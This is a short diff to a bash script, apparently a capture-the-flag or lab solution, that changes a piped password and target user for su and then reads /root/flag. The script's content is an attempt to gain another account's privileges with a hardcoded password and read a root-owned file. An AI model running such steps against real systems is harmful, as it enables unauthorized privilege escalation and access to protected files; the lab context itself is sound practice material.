@@ -1,5 +1,5 @@
 #!/usr/bash
 
-echo "unicorn" | su 
+echo "now" | su cmp
 
 cat /root/flag
